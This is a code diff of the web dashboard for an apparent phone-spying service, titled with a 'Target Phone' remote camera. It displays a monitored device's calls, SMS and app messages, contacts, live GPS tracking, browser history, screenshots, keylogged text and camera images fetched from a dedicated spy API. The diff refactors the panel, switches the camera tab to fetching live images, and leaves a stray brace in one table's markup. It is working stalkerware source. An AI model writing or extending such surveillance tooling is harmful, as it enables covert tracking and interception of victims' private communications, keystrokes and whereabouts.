@@ -9,333 +9,49 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      -webkit-tap-highlight-color: transparent;
-    }
-    
-    body {
-      font-family: 'Inter', sans-serif;
-      background: black;
-      color: #0f0;
-      position: relative;
-      min-height: 100vh;
-      overflow-x: hidden;
-    }
-    
-    #matrix-canvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
-      opacity: 0.5;
-      pointer-events: none;
-    }
-    
-    .menu-toggle {
-      position: fixed;
-      top: 15px;
-      left: 15px;
-      z-index: 1001;
-      background: rgba(0, 0, 0, 0.85);
-      border: 1px solid #0f0;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      backdrop-filter: blur(5px);
-    }
-    
-    .sidebar {
-      position: fixed;
-      left: 0;
-      top: 0;
-      width: 280px;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.95);
-      backdrop-filter: blur(10px);
-      padding: 20px 15px;
-      overflow-y: auto;
-      z-index: 1000;
-      border-right: 1px solid #0f0;
-      transform: translateX(-100%);
-      transition: transform 0.3s ease;
-    }
-    
-    .sidebar.open {
-      transform: translateX(0);
-    }
-    
-    .sidebar .logo {
-      font-size: 20px;
-      font-weight: bold;
-      margin-bottom: 25px;
-      text-align: center;
-      padding-bottom: 15px;
-      border-bottom: 1px solid #0f0;
-    }
-    
-    .sidebar a {
-      color: #cbd5e1;
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      padding: 12px 15px;
-      border-radius: 12px;
-      transition: 0.2s;
-      font-size: 14px;
-      font-weight: 500;
-    }
-    
-    .sidebar a:hover, .sidebar a.active {
-      background: rgba(0, 255, 0, 0.15);
-      color: #0f0;
-    }
-    
-    .sidebar-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.7);
-      z-index: 999;
-      display: none;
-    }
-    
-    .sidebar-overlay.active {
-      display: block;
-    }
-    
-    .main-content {
-      margin-left: 0;
-      padding: 15px;
-      transition: margin-left 0.3s ease;
-      min-height: 100vh;
-    }
-    
-    .top-bar {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-      margin-bottom: 20px;
-      background: rgba(0, 0, 0, 0.7);
-      padding: 15px;
-      border-radius: 16px;
-      border: 1px solid #0f0;
-      backdrop-filter: blur(5px);
-    }
-    
-    .top-bar h2 {
-      font-size: 18px;
-      text-align: center;
-    }
-    
-    .btn-group {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-      flex-wrap: wrap;
-    }
-    
-    .dashboard-card {
-      background: rgba(0, 0, 0, 0.75);
-      border-radius: 20px;
-      padding: 15px;
-      margin-bottom: 15px;
-      border: 1px solid #0f0;
-      backdrop-filter: blur(5px);
-    }
-    
-    .card-title {
-      font-size: 16px;
-      font-weight: 600;
-      margin-bottom: 15px;
-      border-left: 3px solid #0f0;
-      padding-left: 10px;
-    }
-    
-    .stats-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-      gap: 12px;
-      margin-bottom: 20px;
-    }
-    
-    .stat-box {
-      background: rgba(0, 0, 0, 0.6);
-      padding: 12px;
-      border-radius: 16px;
-      text-align: center;
-      border: 1px solid #0f0;
-    }
-    
-    .stat-number {
-      font-size: 26px;
-      font-weight: 800;
-      color: #0f0;
-    }
-    
-    .table-responsive {
-      overflow-x: auto;
-      -webkit-overflow-scrolling: touch;
-    }
-    
-    table {
-      width: 100%;
-      min-width: 500px;
-      border-collapse: collapse;
-      color: #cfd5e1;
-      font-size: 12px;
-    }
-    
-    th, td {
-      padding: 10px 8px;
-      text-align: left;
-      border-bottom: 1px solid #0f0;
-    }
-    
-    th {
-      background: rgba(0, 0, 0, 0.7);
-      color: #0f0;
-    }
-    
-    .btn-outline, .btn-primary {
-      background: none;
-      border: 1px solid #0f0;
-      padding: 10px 18px;
-      border-radius: 40px;
-      cursor: pointer;
-      color: #0f0;
-      transition: 0.2s;
-      font-size: 13px;
-      font-weight: 500;
-      min-height: 44px;
-    }
-    
-    .btn-outline:active, .btn-primary:active {
-      background: #0f0;
-      color: black;
-    }
-    
-    #map {
-      height: 300px;
-      border-radius: 16px;
-      margin-bottom: 15px;
-      border: 1px solid #0f0;
-      background: #111;
-    }
-    
-    .map-controls {
-      display: flex;
-      gap: 8px;
-      margin-bottom: 15px;
-      flex-wrap: wrap;
-    }
-    
-    #screenshotsGrid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
-      gap: 12px;
-    }
-    
-    img.screenshot-thumb {
-      width: 100%;
-      height: auto;
-      max-height: 100px;
-      object-fit: cover;
-      border-radius: 8px;
-      border: 1px solid #0f0;
-      cursor: pointer;
-    }
-    
-    .device-status {
-      display: inline-block;
-      padding: 4px 10px;
-      border-radius: 20px;
-      font-size: 11px;
-      font-weight: 600;
-    }
-    
-    .status-online {
-      background: #0f0;
-      color: black;
-    }
-    
-    .status-offline {
-      background: #f00;
-      color: white;
-    }
-    
-    .camera-preview {
-      max-width: 100%;
-      max-height: 300px;
-      border: 1px solid #0f0;
-      margin-top: 15px;
-      border-radius: 12px;
-      display: none;
-    }
-    
-    .modal {
-      display: none;
-      position: fixed;
-      z-index: 1100;
-      left: 0;
-      top: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0,0,0,0.95);
-    }
-    
-    .modal-content {
-      margin: auto;
-      display: block;
-      max-width: 95%;
-      max-height: 90%;
-      margin-top: 50px;
-    }
-    
-    .close-modal {
-      position: absolute;
-      top: 15px;
-      right: 20px;
-      color: #0f0;
-      font-size: 35px;
-      cursor: pointer;
-    }
-    
-    @media (min-width: 769px) {
-      .menu-toggle { display: none; }
-      .sidebar { transform: translateX(0); width: 260px; }
-      .main-content { margin-left: 260px; padding: 20px; }
-      .top-bar { flex-direction: row; justify-content: space-between; align-items: center; }
-      .top-bar h2 { font-size: 20px; }
-    }
-    
-    @media (max-width: 768px) {
-      .menu-toggle { display: flex; }
-      .sidebar { width: 85%; max-width: 300px; }
-      .btn-outline, .btn-primary { padding: 8px 14px; font-size: 12px; }
-    }
-    
-    @media (max-width: 480px) {
-      .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 8px; }
-      .stat-box { padding: 8px; }
-    }
-    
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    body { font-family: 'Inter', sans-serif; background: black; color: #0f0; position: relative; min-height: 100vh; overflow-x: hidden; }
+    #matrix-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.5; pointer-events: none; }
+    .menu-toggle { position: fixed; top: 15px; left: 15px; z-index: 1001; background: rgba(0,0,0,0.85); border: 1px solid #0f0; border-radius: 50%; width: 50px; height: 50px; display: none; align-items: center; justify-content: center; cursor: pointer; backdrop-filter: blur(5px); }
+    .sidebar { position: fixed; left: 0; top: 0; width: 280px; height: 100%; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); padding: 20px 15px; overflow-y: auto; z-index: 1000; border-right: 1px solid #0f0; transform: translateX(-100%); transition: transform 0.3s ease; }
+    .sidebar.open { transform: translateX(0); }
+    .sidebar .logo { font-size: 20px; font-weight: bold; margin-bottom: 25px; text-align: center; padding-bottom: 15px; border-bottom: 1px solid #0f0; }
+    .sidebar a { color: #cbd5e1; text-decoration: none; display: flex; align-items: center; gap: 12px; padding: 12px 15px; border-radius: 12px; transition: 0.2s; font-size: 14px; font-weight: 500; }
+    .sidebar a:hover, .sidebar a.active { background: rgba(0,255,0,0.15); color: #0f0; }
+    .sidebar-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 999; display: none; }
+    .sidebar-overlay.active { display: block; }
+    .main-content { margin-left: 0; padding: 15px; transition: margin-left 0.3s ease; min-height: 100vh; }
+    .top-bar { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; background: rgba(0,0,0,0.7); padding: 15px; border-radius: 16px; border: 1px solid #0f0; backdrop-filter: blur(5px); }
+    .top-bar h2 { font-size: 18px; text-align: center; }
+    .btn-group { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
+    .dashboard-card { background: rgba(0,0,0,0.75); border-radius: 20px; padding: 15px; margin-bottom: 15px; border: 1px solid #0f0; backdrop-filter: blur(5px); }
+    .card-title { font-size: 16px; font-weight: 600; margin-bottom: 15px; border-left: 3px solid #0f0; padding-left: 10px; }
+    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px,1fr)); gap: 12px; margin-bottom: 20px; }
+    .stat-box { background: rgba(0,0,0,0.6); padding: 12px; border-radius: 16px; text-align: center; border: 1px solid #0f0; }
+    .stat-number { font-size: 26px; font-weight: 800; color: #0f0; }
+    .table-responsive { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+    table { width: 100%; min-width: 500px; border-collapse: collapse; color: #cfd5e1; font-size: 12px; }
+    th, td { padding: 10px 8px; text-align: left; border-bottom: 1px solid #0f0; }
+    th { background: rgba(0,0,0,0.7); color: #0f0; }
+    .btn-outline, .btn-primary { background: none; border: 1px solid #0f0; padding: 10px 18px; border-radius: 40px; cursor: pointer; color: #0f0; transition: 0.2s; font-size: 13px; font-weight: 500; min-height: 44px; }
+    .btn-outline:active, .btn-primary:active { background: #0f0; color: black; }
+    #map { height: 300px; border-radius: 16px; margin-bottom: 15px; border: 1px solid #0f0; background: #111; }
+    .map-controls { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
+    #screenshotsGrid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px,1fr)); gap: 12px; }
+    img.screenshot-thumb { width: 100%; height: auto; max-height: 100px; object-fit: cover; border-radius: 8px; border: 1px solid #0f0; cursor: pointer; }
+    .device-status { display: inline-block; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; }
+    .status-online { background: #0f0; color: black; }
+    .status-offline { background: #f00; color: white; }
+    .camera-preview { max-width: 100%; max-height: 300px; border: 1px solid #0f0; margin-top: 15px; border-radius: 12px; display: none; }
+    .modal { display: none; position: fixed; z-index: 1100; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.95); }
+    .modal-content { margin: auto; display: block; max-width: 95%; max-height: 90%; margin-top: 50px; }
+    .close-modal { position: absolute; top: 15px; right: 20px; color: #0f0; font-size: 35px; cursor: pointer; }
+    @media (min-width: 769px) { .menu-toggle { display: none; } .sidebar { transform: translateX(0); width: 260px; } .main-content { margin-left: 260px; padding: 20px; } .top-bar { flex-direction: row; justify-content: space-between; align-items: center; } }
+    @media (max-width: 768px) { .menu-toggle { display: flex; } .sidebar { width: 85%; max-width: 300px; } }
     .tab-content { display: none; }
     .tab-content.active { display: block; }
-    .note { font-size: 11px; margin-top: 8px; opacity: 0.7; text-align: center; }
-    select { background: #111; border: 1px solid #0f0; color: #0f0; padding: 10px; border-radius: 30px; }
     .loading-placeholder { text-align: center; padding: 20px; color: #0f0; opacity: 0.7; }
+    select { background: #111; border: 1px solid #0f0; color: #0f0; padding: 10px; border-radius: 30px; }
   </style>
 </head>
 <body>
@@ -392,23 +108,21 @@
   <div id="appusage" class="tab-content"><div class="dashboard-card"><div class="card-title">📊 App Usage</div><div class="table-responsive"><table id="appusageTable"><thead><tr><th>App Name</th><th>Foreground Time</th><th>Time</th></tr></thead><tbody><tr><td colspan="3" class="loading-placeholder">Loading app usage...</td></tr></tbody></table></div></div></div>
   <div id="livecamera" class="tab-content"><div class="dashboard-card"><div class="card-title">📷 Remote Camera (Target Phone)</div><div style="margin-bottom:15px; display:flex; gap:8px; flex-wrap:wrap;">
     <select id="cameraDeviceSelect" style="flex:1; min-width: 120px;"><option value="">Select device</option></select>
-    <button id="takePhotoBtn" class="btn-primary"><i class="fas fa-camera"></i> Capture</button>
+    <button id="refreshCameraBtn" class="btn-outline"><i class="fas fa-sync-alt"></i> Refresh</button>
     <button id="startPhotoPollingBtn" class="btn-outline">🔄 Auto OFF</button>
   </div>
   <div id="cameraImageContainer" style="text-align:center;">
     <img id="latestPhoto" class="camera-preview">
-    <p id="cameraMessage" style="font-size:12px;">Select a device and tap Capture to take photo on target phone</p>
+    <p id="cameraMessage" style="font-size:12px;">Select a device (info only) and click Refresh to fetch latest live camera image</p>
   </div></div></div>
 </div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-  // ==================== REAL API INTEGRATION (NO MOCK DATA) ====================
-  const API_BASE = 'https://gauravhanna-spy.onrender.com/api';
+  // ==================== CONFIGURATION ====================
+  const API_BASE = window.location.hostname === 'localhost' ? 'http://localhost:5000/api' : 'https://gauravhanna-spy.onrender.com/api';
   let token = localStorage.getItem('token');
-  // If no token, redirect to login (but for demo we can set a dummy? Actually we must keep login flow)
   if (!token) {
-    // For testing, you can set a token from login.html. If not present, show error.
     document.body.innerHTML = '<div style="color:red; text-align:center; margin-top:50px;">No authentication token. Please login first.<br><a href="login.html" style="color:#0f0;">Go to Login</a></div>';
     throw new Error('No token');
   }
@@ -417,77 +131,53 @@
     try {
       const res = await fetch(`${API_BASE}${endpoint}`, {
         ...options,
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${token}`,
-          ...options.headers
-        }
+        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}`, ...options.headers }
       });
-      if (res.status === 401) {
-        localStorage.removeItem('token');
-        window.location.href = 'login.html';
-        return null;
-      }
+      if (res.status === 401) { localStorage.removeItem('token'); window.location.href = 'login.html'; return null; }
       return await res.json();
-    } catch (err) {
-      console.error(`API Error ${endpoint}:`, err);
-      return { success: false, error: err.message };
-    }
+    } catch (err) { console.error(`API Error ${endpoint}:`, err); return { success: false, error: err.message }; }
   }
 
-  // Helper to render empty table rows
-  function setTableEmpty(tbodyId, columns, message = "No data available") {
-    const tbody = document.querySelector(`#${tbodyId} tbody`);
-    if (tbody) tbody.innerHTML = `<tr><td colspan="${columns}" style="text-align:center;">${message}</td></tr>`;
-  }
-
-  // Dashboard data
+  // ==================== LOAD FUNCTIONS ====================
   async function loadUser() {
     const data = await fetchAPI('/auth/me');
-    if (data && data.success) document.getElementById('userName').innerText = data.user.name || 'Admin';
+    if (data?.success) document.getElementById('userName').innerText = data.user.name || 'Admin';
   }
 
   async function loadDashboard() {
     const stats = await fetchAPI('/data/stats');
-    if (stats && stats.success) {
+    if (stats?.success) {
       const s = stats.stats;
       document.getElementById('statsGrid').innerHTML = `
         <div class="stat-box"><div class="stat-number">${s.totalDevices || 0}</div><div>Devices</div></div>
-        <div class="stat-box"><div class="stat-number">${s.totalMessages || 0}</div><div>SMS</div></div>
+        <div class="stat-box"><div class="stat-number">${s.totalMessages || 0}</div><div>Messages</div></div>
         <div class="stat-box"><div class="stat-number">${s.totalCalls || 0}</div><div>Calls</div></div>
         <div class="stat-box"><div class="stat-number">${s.totalLocations || 0}</div><div>Locations</div></div>
       `;
-    } else {
-      document.getElementById('statsGrid').innerHTML = '<div class="loading-placeholder">Failed to load stats</div>';
-    }
+    } else { document.getElementById('statsGrid').innerHTML = '<div class="loading-placeholder">Failed to load stats</div>'; }
 
-    // Recent activity: combine calls, messages, locations, keylogs, social
-    const [callsRes, messagesRes, locationsRes, keylogsRes, socialRes] = await Promise.all([
-      fetchAPI('/data/calls'), fetchAPI('/data/messages'), fetchAPI('/data/locations'),
-      fetchAPI('/data/keylogs'), fetchAPI('/data/social-messages')
+    const [callsRes, messagesRes, locationsRes, keylogsRes] = await Promise.all([
+      fetchAPI('/data/calls'), fetchAPI('/data/messages'), fetchAPI('/data/locations'), fetchAPI('/data/keylogs')
     ]);
     let all = [];
     if (callsRes?.success && callsRes.data) all.push(...callsRes.data.map(c => ({ ...c, _type: 'call' })));
     if (messagesRes?.success && messagesRes.data) all.push(...messagesRes.data.map(m => ({ ...m, _type: 'sms' })));
     if (locationsRes?.success && locationsRes.data) all.push(...locationsRes.data.map(l => ({ ...l, _type: 'location' })));
     if (keylogsRes?.success && keylogsRes.data) all.push(...keylogsRes.data.map(k => ({ ...k, _type: 'keylog' })));
-    if (socialRes?.success && socialRes.data) all.push(...socialRes.data.map(s => ({ ...s, _type: 'social' })));
-
-    all.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+    all.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
     let html = '<div class="table-responsive"><table><thead><tr><th>Type</th><th>Details</th><th>Time</th></tr></thead><tbody>';
     if (all.length === 0) html += '<tr><td colspan="3">No recent activity</td></tr>';
     else {
       all.slice(0, 20).forEach(item => {
         let details = '', type = '';
         if (item._type === 'call') { type = '📞 Call'; details = `${item.callType || ''} call with ${item.contactName || item.phoneNumber}`; }
-        else if (item._type === 'sms') { type = '💬 SMS'; details = `${item.contactNumber || '?'}: ${(item.message || '').substring(0, 40)}`; }
-        else if (item._type === 'location') { type = '📍 Location'; details = (item.address || '').substring(0, 50); }
-        else if (item._type === 'keylog') { type = '⌨️ Keylog'; details = `${item.appPackage || ''}: ${(item.text || '').substring(0, 40)}`; }
-        else if (item._type === 'social') { type = `📱 ${item.app || 'Social'}`; details = `${item.sender || ''}: ${(item.message || '').substring(0, 40)}`; }
+        else if (item._type === 'sms') { type = '💬 SMS'; details = `${item.contactNumber || '?'}: ${(item.message || '').substring(0,40)}`; }
+        else if (item._type === 'location') { type = '📍 Location'; details = (item.address || '').substring(0,50); }
+        else if (item._type === 'keylog') { type = '⌨️ Keylog'; details = `${item.appPackage || ''}: ${(item.text || '').substring(0,40)}`; }
         html += `<tr><td>${type}</td><td>${details}</td><td>${new Date(item.timestamp).toLocaleString()}</td></tr>`;
       });
     }
-    html += '</tbody></table></div>';
+    html += '</tbody>}</table></div>';
     document.getElementById('recentActivity').innerHTML = html;
   }
 
@@ -495,113 +185,66 @@
     const res = await fetchAPI('/data/devices');
     const tbody = document.querySelector('#devicesTable tbody');
     if (!tbody) return;
-    if (res?.success && res.data && res.data.length) {
+    if (res?.success && res.data?.length) {
       tbody.innerHTML = '';
       res.data.forEach(device => {
         const lastSeen = new Date(device.lastSeen);
         const isOnline = (new Date() - lastSeen) / 60000 < 5;
-        tbody.innerHTML += `<tr>
-          <td>${device.deviceName || 'Unknown'}</td>
-          <td>${device.deviceModel || 'Unknown'}</td>
-          <td><span class="device-status ${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? 'Online' : 'Offline'}</span></td>
-          <td>${lastSeen.toLocaleString()}</td>
-        </tr>`;
+        tbody.innerHTML += `<tr><td>${device.deviceName || 'Unknown'}</td><td>${device.deviceModel || 'Unknown'}</td><td><span class="device-status ${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? 'Online' : 'Offline'}</span></td><td>${lastSeen.toLocaleString()}</td></tr>`;
       });
-    } else {
-      tbody.innerHTML = '<tr><td colspan="4">No devices found</td></tr>';
-    }
+    } else { tbody.innerHTML = '<tr><td colspan="4">No devices found</td></tr>'; }
   }
 
   async function loadCalls() {
     const res = await fetchAPI('/data/calls');
     const tbody = document.querySelector('#callsTable tbody');
     if (!tbody) return;
-    if (res?.success && res.data && res.data.length) {
+    if (res?.success && res.data?.length) {
       tbody.innerHTML = '';
       res.data.forEach(call => {
-        tbody.innerHTML += `<tr>
-          <td>${call.contactName || ''}</td>
-          <td>${call.phoneNumber || ''}</td>
-          <td>${call.callType || ''}</td>
-          <td>${call.duration || 0}s</td>
-          <td>${new Date(call.timestamp).toLocaleString()}</td>
-        </tr>`;
+        tbody.innerHTML += `<tr><td>${call.contactName || ''}</td><td>${call.phoneNumber || ''}</td><td>${call.callType || ''}</td><td>${call.duration || 0}s</td><td>${new Date(call.timestamp).toLocaleString()}</td></tr>`;
       });
-    } else {
-      tbody.innerHTML = '<tr><td colspan="5">No call logs</td></tr>';
-    }
+    } else { tbody.innerHTML = '<tr><td colspan="5">No call logs</td></tr>'; }
   }
 
-  async function loadSMSMessages() {
-    const res = await fetchAPI('/data/messages');
-    const tbody = document.querySelector('#messagesTable tbody');
-    if (!tbody) return;
-    if (res?.success && res.data && res.data.length) {
-      tbody.innerHTML = '';
-      res.data.forEach(msg => {
-        tbody.innerHTML += `<tr>
-          <td>${msg.contactNumber || ''}</td>
-          <td>${(msg.message || '').substring(0, 60)}</td>
-          <td>${new Date(msg.timestamp).toLocaleString()}</td>
-        </tr>`;
-      });
-    } else {
-      tbody.innerHTML = '<tr><td colspan="3">No SMS messages</td></tr>';
-    }
-  }
-
-  async function loadSocialMessages(appName, tableId) {
-    const res = await fetchAPI('/data/social-messages');
+  async function loadMessagesByApp(appName, tableId, filterField = 'app') {
+    let endpoint = '/data/messages';
+    if (appName !== 'sms') endpoint = `/data/messages/${appName}`;
+    const res = await fetchAPI(endpoint);
     const tbody = document.querySelector(`#${tableId} tbody`);
     if (!tbody) return;
-    if (res?.success && res.data) {
-      const filtered = res.data.filter(msg => msg.app === appName);
+    if (res?.success && res.data?.length) {
+      let filtered = res.data;
+      if (appName === 'sms') filtered = res.data.filter(m => m.app === 'sms');
       if (filtered.length) {
         tbody.innerHTML = '';
         filtered.forEach(msg => {
-          tbody.innerHTML += `<tr>
-            <td>${msg.sender || 'Unknown'}</td>
-            <td>${(msg.message || '').substring(0, 60)}</td>
-            <td>${new Date(msg.timestamp).toLocaleString()}</td>
-          </tr>`;
+          tbody.innerHTML += `<tr><td>${msg.contactName || msg.contactNumber || 'Unknown'}</td><td>${(msg.message || '').substring(0,60)}</td><td>${new Date(msg.timestamp).toLocaleString()}</td></tr>`;
         });
-      } else {
-        tbody.innerHTML = '<tr><td colspan="3">No messages</td></tr>';
-      }
-    } else {
-      tbody.innerHTML = '<tr><td colspan="3">Failed to load</td></tr>';
-    }
+      } else { tbody.innerHTML = '<tr><td colspan="3">No messages</td></tr>'; }
+    } else { tbody.innerHTML = '<tr><td colspan="3">No messages</td></tr>'; }
   }
 
   async function loadContacts() {
     const res = await fetchAPI('/data/contacts');
     const tbody = document.querySelector('#contactsTable tbody');
     if (!tbody) return;
-    if (res?.success && res.data && res.data.length) {
+    if (res?.success && res.data?.length) {
       tbody.innerHTML = '';
-      res.data.forEach(contact => {
-        tbody.innerHTML += `<tr><td>${contact.name || ''}</td><td>${contact.number || ''}</td></tr>`;
-      });
-    } else {
-      tbody.innerHTML = '<tr><td colspan="2">No contacts</td></tr>';
-    }
+      res.data.forEach(contact => { tbody.innerHTML += `<tr><td>${contact.name || ''}</td><td>${contact.number || ''}</td></tr>`; });
+    } else { tbody.innerHTML = '<tr><td colspan="2">No contacts</td></tr>'; }
   }
 
   let map, liveInterval = null, liveActive = false, locationData = [];
-
   async function loadLocations(keepMap = false) {
     const res = await fetchAPI('/data/locations');
     const tbody = document.querySelector('#locationsTable tbody');
     if (!tbody) return;
-    if (res?.success && res.data && res.data.length) {
+    if (res?.success && res.data?.length) {
       locationData = res.data;
       tbody.innerHTML = '';
       locationData.forEach(loc => {
-        tbody.innerHTML += `<tr>
-          <td>${loc.address || ''}</td>
-          <td>${loc.lat}, ${loc.lng}</td>
-          <td>${new Date(loc.timestamp).toLocaleString()}</td>
-        </tr>`;
+        tbody.innerHTML += `<tr><td>${loc.address || ''}</td><td>${loc.lat}, ${loc.lng}</td><td>${new Date(loc.timestamp).toLocaleString()}</td></tr>`;
       });
       if (!keepMap && !map) {
         map = L.map('map').setView([locationData[0].lat, locationData[0].lng], 13);
@@ -612,55 +255,33 @@
         locationData.forEach(loc => L.marker([loc.lat, loc.lng]).addTo(map).bindPopup(loc.address || `Location`));
         if (locationData.length > 1) map.fitBounds(locationData.map(p => [p.lat, p.lng]));
       }
-    } else {
-      tbody.innerHTML = '<tr><td colspan="3">No location data</td></tr>';
-    }
+    } else { tbody.innerHTML = '<tr><td colspan="3">No location data</td></tr>'; }
   }
-
-  function centerOnLatest() {
-    if (locationData.length && map) map.setView([locationData[0].lat, locationData[0].lng], 15);
-  }
-
+  function centerOnLatest() { if (locationData.length && map) map.setView([locationData[0].lat, locationData[0].lng], 15); }
   function toggleLiveTracking() {
     liveActive = !liveActive;
     const btn = document.getElementById('liveTrackingBtn');
-    if (liveActive) {
-      if (liveInterval) clearInterval(liveInterval);
-      liveInterval = setInterval(() => loadLocations(true), 10000);
-      btn.innerHTML = "🔴 Live ON";
-      btn.style.background = "#0f0";
-      btn.style.color = "black";
-    } else {
-      if (liveInterval) clearInterval(liveInterval);
-      btn.innerHTML = "🔴 Live OFF";
-      btn.style.background = "";
-      btn.style.color = "";
-    }
+    if (liveActive) { if (liveInterval) clearInterval(liveInterval); liveInterval = setInterval(() => loadLocations(true), 10000); btn.innerHTML = "🔴 Live ON"; btn.style.background = "#0f0"; btn.style.color = "black"; }
+    else { if (liveInterval) clearInterval(liveInterval); btn.innerHTML = "🔴 Live OFF"; btn.style.background = ""; btn.style.color = ""; }
   }
 
   async function loadBrowser() {
-    const res = await fetchAPI('/data/browser-history');
+    const res = await fetchAPI('/data/browser');
     const tbody = document.querySelector('#browserTable tbody');
     if (!tbody) return;
-    if (res?.success && res.data && res.data.length) {
+    if (res?.success && res.data?.length) {
       tbody.innerHTML = '';
       res.data.forEach(hist => {
-        tbody.innerHTML += `<tr>
-          <td><a href="#" style="color:#0f0;">${(hist.url || '').substring(0, 50)}</a></td>
-          <td>${(hist.title || '').substring(0, 40)}</td>
-          <td>${new Date(hist.timestamp).toLocaleString()}</td>
-        </tr>`;
+        tbody.innerHTML += `<tr><td><a href="#" style="color:#0f0;">${(hist.url || '').substring(0,50)}</a></td><td>${(hist.title || '').substring(0,40)}</td><td>${new Date(hist.visitTime || hist.timestamp).toLocaleString()}</td></tr>`;
       });
-    } else {
-      tbody.innerHTML = '<tr><td colspan="3">No browser history</td></tr>';
-    }
+    } else { tbody.innerHTML = '<tr><td colspan="3">No browser history</td></tr>'; }
   }
 
   async function loadScreenshots() {
     const res = await fetchAPI('/data/screenshots');
     const grid = document.getElementById('screenshotsGrid');
     if (!grid) return;
-    if (res?.success && res.data && res.data.length) {
+    if (res?.success && res.data?.length) {
       grid.innerHTML = '';
       res.data.forEach(shot => {
         const img = document.createElement('img');
@@ -669,139 +290,91 @@
         img.onclick = () => { document.getElementById('modalImage').src = img.src; document.getElementById('imageModal').style.display = 'block'; };
         grid.appendChild(img);
       });
-    } else {
-      grid.innerHTML = '<div class="loading-placeholder">No screenshots</div>';
-    }
+    } else { grid.innerHTML = '<div class="loading-placeholder">No screenshots</div>'; }
   }
 
   async function loadKeylogs() {
     const res = await fetchAPI('/data/keylogs');
     const tbody = document.querySelector('#keylogsTable tbody');
     if (!tbody) return;
-    if (res?.success && res.data && res.data.length) {
+    if (res?.success && res.data?.length) {
       tbody.innerHTML = '';
       res.data.forEach(log => {
-        tbody.innerHTML += `<tr>
-          <td>${log.appPackage || ''}</td>
-          <td>${(log.text || '').substring(0, 60)}</td>
-          <td>${new Date(log.timestamp).toLocaleString()}</td>
-        </tr>`;
+        tbody.innerHTML += `<tr><td>${log.appPackage || ''}</td><td>${(log.text || '').substring(0,60)}</td><td>${new Date(log.timestamp).toLocaleString()}</td></tr>`;
       });
-    } else {
-      tbody.innerHTML = '<tr><td colspan="3">No keylogs</td></tr>';
-    }
+    } else { tbody.innerHTML = '<tr><td colspan="3">No keylogs</td></tr>'; }
   }
 
   async function loadAppUsage() {
     const res = await fetchAPI('/data/app-usage');
     const tbody = document.querySelector('#appusageTable tbody');
     if (!tbody) return;
-    if (res?.success && res.data && res.data.length) {
+    if (res?.success && res.data?.length) {
       tbody.innerHTML = '';
       res.data.forEach(usage => {
-        tbody.innerHTML += `<tr>
-          <td>${usage.appName || ''}</td>
-          <td>${usage.foregroundTime || 0}s</td>
-          <td>${new Date(usage.timestamp).toLocaleString()}</td>
-        </tr>`;
+        tbody.innerHTML += `<tr><td>${usage.appName || ''}</td><td>${usage.foregroundTime || 0}s</td><td>${new Date(usage.timestamp).toLocaleString()}</td></tr>`;
       });
-    } else {
-      tbody.innerHTML = '<tr><td colspan="3">No app usage</td></tr>';
-    }
+    } else { tbody.innerHTML = '<tr><td colspan="3">No app usage</td></tr>'; }
   }
 
-  // Remote Camera (target phone)
-  async function loadCameraDevices() {
-    const res = await fetchAPI('/data/devices');
+  // Live Camera: fetch images with type='live' from Screenshot model
+  async function loadLiveCamera() {
+    const res = await fetchAPI('/data/live-camera');
     const select = document.getElementById('cameraDeviceSelect');
-    if (!select) return;
-    if (res?.success && res.data && res.data.length) {
-      select.innerHTML = '<option value="">Select device</option>';
-      res.data.forEach(device => {
+    if (res?.success && res.data?.length) {
+      const latest = res.data[0];
+      const img = document.getElementById('latestPhoto');
+      img.src = latest.imageBase64.startsWith('data:') ? latest.imageBase64 : `data:image/jpeg;base64,${latest.imageBase64}`;
+      img.style.display = 'block';
+      document.getElementById('cameraMessage').innerHTML = `Latest live image at ${new Date(latest.timestamp).toLocaleString()}`;
+    } else {
+      document.getElementById('latestPhoto').style.display = 'none';
+      document.getElementById('cameraMessage').innerHTML = 'No live camera images yet. Ensure mobile app sends to /client/live-camera with type="live".';
+    }
+    // populate device select for info
+    const devicesRes = await fetchAPI('/data/devices');
+    if (devicesRes?.success && devicesRes.data?.length) {
+      select.innerHTML = '<option value="">Select device (info only)</option>';
+      devicesRes.data.forEach(device => {
         const option = document.createElement('option');
         option.value = device.deviceId;
         option.textContent = device.deviceName || device.deviceModel || device.deviceId;
         select.appendChild(option);
       });
-    } else {
